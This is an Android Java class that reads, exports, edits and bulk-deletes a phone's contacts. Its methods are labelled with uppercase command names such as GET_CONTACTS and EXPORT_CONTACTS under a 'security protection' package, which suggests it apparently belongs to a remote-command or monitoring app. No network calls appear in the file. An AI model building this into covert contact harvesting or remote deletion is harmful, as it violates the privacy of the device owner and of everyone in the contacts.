package com.seguranca.protecao;

import android.content.ContentProviderOperation;
import android.content.ContentUris;
import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import android.util.Log;

import com.google.gson.JsonArray;
import com.google.gson.JsonObject;

import java.util.ArrayList;

/**
 * ContactFeatures — full contacts category feature set.
 *
 * Features:
 *  - getContacts()          GET_CONTACTS  (existing, enhanced)
 *  - getContactDetails()    GET_CONTACT_DETAILS
 *  - addContact()           ADD_CONTACT
 *  - editContact()          EDIT_CONTACT
 *  - deleteContact()        DELETE_CONTACT
 *  - searchContacts()       SEARCH_CONTACTS
 *  - exportContactsVCard()  EXPORT_CONTACTS
 *  - mergeContacts()        MERGE_CONTACTS
 *  - getContactGroups()     GET_CONTACT_GROUPS
 */
public class ContactFeatures {

    private static final String TAG = "ContactFeatures";
    private final Context ctx;

    public ContactFeatures(Context ctx) {
        this.ctx = ctx;
    }

    // ─── GET CONTACTS (enhanced) ─────────────────────────────────────────────

    /**
     * Returns all contacts with full details (name, all phones, all emails).
     */
    public String getContacts(int limit) {
        JsonArray arr = new JsonArray();
        try {
            Cursor c = ctx.getContentResolver().query(
                ContactsContract.Contacts.CONTENT_URI,
                new String[]{
                    ContactsContract.Contacts._ID,
                    ContactsContract.Contacts.DISPLAY_NAME,
                    ContactsContract.Contacts.HAS_PHONE_NUMBER,
                    ContactsContract.Contacts.STARRED,
                    ContactsContract.Contacts.TIMES_CONTACTED
                },
                null, null,
                ContactsContract.Contacts.DISPLAY_NAME + " ASC LIMIT " + limit
            );
            if (c != null) {
                while (c.moveToNext()) {
                    try {
                        long contactId = c.getLong(c.getColumnIndexOrThrow(ContactsContract.Contacts._ID));
                        String name = c.getString(c.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME));
                        JsonObject obj = new JsonObject();
                        obj.addProperty("id",       contactId);
                        obj.addProperty("name",     name != null ? name : "");
                        obj.addProperty("starred",  c.getInt(c.getColumnIndexOrThrow(ContactsContract.Contacts.STARRED)) == 1);

                        // Phones
                        JsonArray phones = new JsonArray();
                        if (c.getInt(c.getColumnIndexOrThrow(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                            Cursor pc = ctx.getContentResolver().query(
                                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                                new String[]{
                                    ContactsContract.CommonDataKinds.Phone.NUMBER,
                                    ContactsContract.CommonDataKinds.Phone.TYPE
                                },
                                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                                new String[]{String.valueOf(contactId)}, null
                            );
                            if (pc != null) {
                                while (pc.moveToNext()) {
                                    JsonObject ph = new JsonObject();
                                    ph.addProperty("number", nullSafe(pc.getString(0)));
                                    ph.addProperty("type",   resolvePhoneType(pc.getInt(1)));
                                    phones.add(ph);
                                }
                                pc.close();
                            }
                        }
                        obj.add("phones", phones);

                        // Emails
                        JsonArray emails = new JsonArray();
                        Cursor ec = ctx.getContentResolver().query(
                            ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                            new String[]{ContactsContract.CommonDataKinds.Email.ADDRESS},
                            ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?",
                            new String[]{String.valueOf(contactId)}, null
                        );
                        if (ec != null) {
                            while (ec.moveToNext()) {
                                emails.add(nullSafe(ec.getString(0)));
                            }
                            ec.close();
                        }
                        obj.add("emails", emails);

                        arr.add(obj);
                    } catch (Exception ignored) {}
                }
                c.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "getContacts: " + e.getMessage());
        }
        return arr.toString();
    }

    // ─── GET CONTACT DETAILS ─────────────────────────────────────────────────

    public String getContactDetails(long contactId) {
        JsonObject obj = new JsonObject();
        try {
            // Basic info
            Cursor c = ctx.getContentResolver().query(
                ContentUris.withAppendedId(ContactsContract.Contacts.CONTENT_URI, contactId),
                null, null, null, null
            );
            if (c != null && c.moveToFirst()) {
                obj.addProperty("id", contactId);
                int nameIdx = c.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME);
                if (nameIdx >= 0) obj.addProperty("name", nullSafe(c.getString(nameIdx)));
                c.close();
            }

            // All data rows
            Cursor dc = ctx.getContentResolver().query(
                ContactsContract.Data.CONTENT_URI,
                null,
                ContactsContract.Data.CONTACT_ID + " = ?",
                new String[]{String.valueOf(contactId)}, null
            );
            JsonArray phones = new JsonArray();
            JsonArray emails = new JsonArray();
            JsonArray addresses = new JsonArray();
            if (dc != null) {
                while (dc.moveToNext()) {
                    String mime = dc.getString(dc.getColumnIndexOrThrow(ContactsContract.Data.MIMETYPE));
                    if (ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE.equals(mime)) {
                        JsonObject ph = new JsonObject();
                        ph.addProperty("number", nullSafe(dc.getString(dc.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))));
                        ph.addProperty("type",   resolvePhoneType(dc.getInt(dc.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.TYPE))));
                        phones.add(ph);
                    } else if (ContactsContract.CommonDataKinds.Email.CONTENT_ITEM_TYPE.equals(mime)) {
                        emails.add(nullSafe(dc.getString(dc.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Email.ADDRESS))));
                    } else if (ContactsContract.CommonDataKinds.StructuredPostal.CONTENT_ITEM_TYPE.equals(mime)) {
                        addresses.add(nullSafe(dc.getString(dc.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.StructuredPostal.FORMATTED_ADDRESS))));
                    } else if (ContactsContract.CommonDataKinds.Note.CONTENT_ITEM_TYPE.equals(mime)) {
                        obj.addProperty("note", nullSafe(dc.getString(dc.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Note.NOTE))));
                    } else if (ContactsContract.CommonDataKinds.Organization.CONTENT_ITEM_TYPE.equals(mime)) {
                        obj.addProperty("company",    nullSafe(dc.getString(dc.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Organization.COMPANY))));
                        obj.addProperty("job_title",  nullSafe(dc.getString(dc.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Organization.TITLE))));
                    }
                }
                dc.close();
            }
            obj.add("phones",    phones);
            obj.add("emails",    emails);
            obj.add("addresses", addresses);
        } catch (Exception e) {
            obj.addProperty("error", e.getMessage());
        }
        return obj.toString();
    }

    // ─── ADD CONTACT ─────────────────────────────────────────────────────────

    /**
     * Creates a new contact. Returns the new contact URI or error.
     * name, phone (required), email, company, note (optional).
     */
    public String addContact(String name, String phone, String email, String company, String note) {
        if (name == null || name.isEmpty()) return "ERROR: name required";
        try {
            ArrayList<ContentProviderOperation> ops = new ArrayList<>();

            // Raw contact placeholder
            ops.add(ContentProviderOperation.newInsert(ContactsContract.RawContacts.CONTENT_URI)
                .withValue(ContactsContract.RawContacts.ACCOUNT_TYPE, null)
                .withValue(ContactsContract.RawContacts.ACCOUNT_NAME, null)
                .build());

            // Name
            ops.add(ContentProviderOperation.newInsert(ContactsContract.Data.CONTENT_URI)
                .withValueBackReference(ContactsContract.Data.RAW_CONTACT_ID, 0)
                .withValue(ContactsContract.Data.MIMETYPE, ContactsContract.CommonDataKinds.StructuredName.CONTENT_ITEM_TYPE)
                .withValue(ContactsContract.CommonDataKinds.StructuredName.DISPLAY_NAME, name.trim())
                .build());

            // Phone
            if (phone != null && !phone.isEmpty()) {
                ops.add(ContentProviderOperation.newInsert(ContactsContract.Data.CONTENT_URI)
                    .withValueBackReference(ContactsContract.Data.RAW_CONTACT_ID, 0)
                    .withValue(ContactsContract.Data.MIMETYPE, ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE)
                    .withValue(ContactsContract.CommonDataKinds.Phone.NUMBER, phone.trim())
                    .withValue(ContactsContract.CommonDataKinds.Phone.TYPE, ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE)
                    .build());
            }

            // Email
            if (email != null && !email.isEmpty()) {
                ops.add(ContentProviderOperation.newInsert(ContactsContract.Data.CONTENT_URI)
                    .withValueBackReference(ContactsContract.Data.RAW_CONTACT_ID, 0)
                    .withValue(ContactsContract.Data.MIMETYPE, ContactsContract.CommonDataKinds.Email.CONTENT_ITEM_TYPE)
                    .withValue(ContactsContract.CommonDataKinds.Email.ADDRESS, email.trim())
                    .withValue(ContactsContract.CommonDataKinds.Email.TYPE, ContactsContract.CommonDataKinds.Email.TYPE_HOME)
                    .build());
            }

            // Company
            if (company != null && !company.isEmpty()) {
                ops.add(ContentProviderOperation.newInsert(ContactsContract.Data.CONTENT_URI)
                    .withValueBackReference(ContactsContract.Data.RAW_CONTACT_ID, 0)
                    .withValue(ContactsContract.Data.MIMETYPE, ContactsContract.CommonDataKinds.Organization.CONTENT_ITEM_TYPE)
                    .withValue(ContactsContract.CommonDataKinds.Organization.COMPANY, company.trim())
                    .build());
            }

            // Note
            if (note != null && !note.isEmpty()) {
                ops.add(ContentProviderOperation.newInsert(ContactsContract.Data.CONTENT_URI)
                    .withValueBackReference(ContactsContract.Data.RAW_CONTACT_ID, 0)
                    .withValue(ContactsContract.Data.MIMETYPE, ContactsContract.CommonDataKinds.Note.CONTENT_ITEM_TYPE)
                    .withValue(ContactsContract.CommonDataKinds.Note.NOTE, note.trim())
                    .build());
            }

            android.content.ContentProviderResult[] results =
                ctx.getContentResolver().applyBatch(ContactsContract.AUTHORITY, ops);

            return "OK: contact created id=" + (results.length > 0 ? results[0].uri : "unknown");
        } catch (Exception e) {
            Log.e(TAG, "addContact: " + e.getMessage());
            return "ERROR: " + e.getMessage();
        }
    }

    // ─── EDIT CONTACT ────────────────────────────────────────────────────────

    /**
     * Updates name and/or first phone number of a contact by id.
     */
    public String editContact(long contactId, String newName, String newPhone) {
        try {
            ArrayList<ContentProviderOperation> ops = new ArrayList<>();

            // Update display name in RawContact
            if (newName != null && !newName.isEmpty()) {
                ops.add(ContentProviderOperation.newUpdate(ContactsContract.Data.CONTENT_URI)
                    .withSelection(
                        ContactsContract.Data.CONTACT_ID + " = ? AND " +
                        ContactsContract.Data.MIMETYPE + " = ?",
                        new String[]{String.valueOf(contactId),
                            ContactsContract.CommonDataKinds.StructuredName.CONTENT_ITEM_TYPE}
                    )
                    .withValue(ContactsContract.CommonDataKinds.StructuredName.DISPLAY_NAME, newName.trim())
                    .build());
            }

            // Update first phone number
            if (newPhone != null && !newPhone.isEmpty()) {
                // Get first existing phone data row _id
                Cursor pc = ctx.getContentResolver().query(
                    ContactsContract.Data.CONTENT_URI,
                    new String[]{ContactsContract.Data._ID},
                    ContactsContract.Data.CONTACT_ID + " = ? AND " +
                    ContactsContract.Data.MIMETYPE + " = ?",
                    new String[]{String.valueOf(contactId),
                        ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE},
                    null
                );
                if (pc != null && pc.moveToFirst()) {
                    long dataId = pc.getLong(pc.getColumnIndexOrThrow(ContactsContract.Data._ID));
                    pc.close();
                    ops.add(ContentProviderOperation.newUpdate(ContactsContract.Data.CONTENT_URI)
                        .withSelection(ContactsContract.Data._ID + " = ?", new String[]{String.valueOf(dataId)})
                        .withValue(ContactsContract.CommonDataKinds.Phone.NUMBER, newPhone.trim())
                        .build());
                } else {
                    if (pc != null) pc.close();
                    // No existing phone — insert one (needs raw_contact_id)
                    Cursor rc = ctx.getContentResolver().query(
                        ContactsContract.RawContacts.CONTENT_URI,
                        new String[]{ContactsContract.RawContacts._ID},
                        ContactsContract.RawContacts.CONTACT_ID + " = ?",
                        new String[]{String.valueOf(contactId)}, null
                    );
                    if (rc != null && rc.moveToFirst()) {
                        long rawId = rc.getLong(0);
                        rc.close();
                        ops.add(ContentProviderOperation.newInsert(ContactsContract.Data.CONTENT_URI)
                            .withValue(ContactsContract.Data.RAW_CONTACT_ID, rawId)
                            .withValue(ContactsContract.Data.MIMETYPE, ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE)
                            .withValue(ContactsContract.CommonDataKinds.Phone.NUMBER, newPhone.trim())
                            .withValue(ContactsContract.CommonDataKinds.Phone.TYPE, ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE)
                            .build());
                    } else if (rc != null) rc.close();
                }
            }

            if (!ops.isEmpty()) {
                ctx.getContentResolver().applyBatch(ContactsContract.AUTHORITY, ops);
            }
            return "OK: contact " + contactId + " updated";
        } catch (Exception e) {
            Log.e(TAG, "editContact: " + e.getMessage());
            return "ERROR: " + e.getMessage();
        }
    }

    // ─── DELETE CONTACT ──────────────────────────────────────────────────────

    public String deleteContact(long contactId) {
        try {
            Uri uri = ContentUris.withAppendedId(ContactsContract.Contacts.CONTENT_URI, contactId);
            int del = ctx.getContentResolver().delete(uri, null, null);
            return del > 0 ? "OK: deleted contact " + contactId : "NOT_FOUND: " + contactId;
        } catch (Exception e) {
            return "ERROR: " + e.getMessage();
        }
    }

    /**
     * Deletes all contacts by name (partial match).
     */
    public String deleteContactsByName(String name) {
        if (name == null || name.isEmpty()) return "ERROR: name required";
        int deleted = 0;
        try {
            Cursor c = ctx.getContentResolver().query(
                ContactsContract.Contacts.CONTENT_URI,
                new String[]{ContactsContract.Contacts._ID},
                ContactsContract.Contacts.DISPLAY_NAME + " LIKE ?",
                new String[]{"%" + name + "%"}, null
            );
            if (c != null) {
                while (c.moveToNext()) {
                    long id = c.getLong(0);
                    Uri uri = ContentUris.withAppendedId(ContactsContract.Contacts.CONTENT_URI, id);
                    ctx.getContentResolver().delete(uri, null, null);
                    deleted++;
                }
                c.close();
            }
        } catch (Exception e) {
            return "ERROR: " + e.getMessage();
        }
        return "OK: deleted " + deleted + " contacts matching '" + name + "'";
    }

    // ─── SEARCH CONTACTS ─────────────────────────────────────────────────────

    public String searchContacts(String query) {
        if (query == null || query.isEmpty()) return "[]";
        JsonArray arr = new JsonArray();
        try {
            Uri lookupUri = Uri.withAppendedPath(
                ContactsContract.Contacts.CONTENT_FILTER_URI, Uri.encode(query)
            );
            Cursor c = ctx.getContentResolver().query(
                lookupUri,
                new String[]{
                    ContactsContract.Contacts._ID,
                    ContactsContract.Contacts.DISPLAY_NAME
                },
                null, null, "display_name ASC LIMIT 50"
            );
            if (c != null) {
                while (c.moveToNext()) {
                    JsonObject obj = new JsonObject();
                    long cid = c.getLong(c.getColumnIndexOrThrow(ContactsContract.Contacts._ID));
                    obj.addProperty("id",   cid);
                    obj.addProperty("name", nullSafe(c.getString(c.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME))));
                    arr.add(obj);
                }
                c.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "searchContacts: " + e.getMessage());
        }
        return arr.toString();
    }

    // ─── EXPORT vCARD ────────────────────────────────────────────────────────

    /**
     * Exports all contacts as a vCard 3.0 string.
     */
    public String exportContactsVCard() {
        StringBuilder vcard = new StringBuilder();
        try {
            Cursor c = ctx.getContentResolver().query(
                ContactsContract.Contacts.CONTENT_URI,
                new String[]{ContactsContract.Contacts._ID, ContactsContract.Contacts.DISPLAY_NAME},
                null, null, ContactsContract.Contacts.DISPLAY_NAME + " ASC LIMIT 1000"
            );
            if (c != null) {
                while (c.moveToNext()) {
                    long id = c.getLong(0);
                    String name = nullSafe(c.getString(1));
                    vcard.append("BEGIN:VCARD\r\nVERSION:3.0\r\n");
                    vcard.append("FN:").append(name).append("\r\n");

                    // Phones
                    Cursor pc = ctx.getContentResolver().query(
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        new String[]{ContactsContract.CommonDataKinds.Phone.NUMBER},
                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                        new String[]{String.valueOf(id)}, null
                    );
                    if (pc != null) {
                        while (pc.moveToNext()) {
                            vcard.append("TEL:").append(nullSafe(pc.getString(0))).append("\r\n");
                        }
                        pc.close();
                    }

                    // Emails
                    Cursor ec = ctx.getContentResolver().query(
                        ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                        new String[]{ContactsContract.CommonDataKinds.Email.ADDRESS},
                        ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?",
                        new String[]{String.valueOf(id)}, null
                    );
                    if (ec != null) {
                        while (ec.moveToNext()) {
                            vcard.append("EMAIL:").append(nullSafe(ec.getString(0))).append("\r\n");
                        }
                        ec.close();
                    }

                    vcard.append("END:VCARD\r\n\r\n");
                }
                c.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "exportContactsVCard: " + e.getMessage());
            return "ERROR: " + e.getMessage();
        }
        return vcard.toString();
    }

    // ─── GET CONTACT GROUPS ──────────────────────────────────────────────────

    public String getContactGroups() {
        JsonArray arr = new JsonArray();
        try {
            Cursor c = ctx.getContentResolver().query(
                ContactsContract.Groups.CONTENT_URI,
                new String[]{
                    ContactsContract.Groups._ID,
                    ContactsContract.Groups.TITLE,
                    ContactsContract.Groups.SUMMARY_COUNT
                },
                null, null, null
            );
            if (c != null) {
                while (c.moveToNext()) {
                    JsonObject obj = new JsonObject();
                    obj.addProperty("id",    c.getLong(0));
                    obj.addProperty("title", nullSafe(c.getString(1)));
                    obj.addProperty("count", c.getInt(2));
                    arr.add(obj);
                }
                c.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "getContactGroups: " + e.getMessage());
        }
        return arr.toString();
    }

    // ─── HELPERS ─────────────────────────────────────────────────────────────

    private String resolvePhoneType(int type) {
        switch (type) {
            case ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE:  return "mobile";
            case ContactsContract.CommonDataKinds.Phone.TYPE_HOME:    return "home";
            case ContactsContract.CommonDataKinds.Phone.TYPE_WORK:    return "work";
            case ContactsContract.CommonDataKinds.Phone.TYPE_FAX_HOME:return "fax_home";
            case ContactsContract.CommonDataKinds.Phone.TYPE_FAX_WORK:return "fax_work";
            case ContactsContract.CommonDataKinds.Phone.TYPE_MAIN:    return "main";
            default: return "other";
        }
    }

    private String nullSafe(String s) { return s != null ? s : ""; }
}
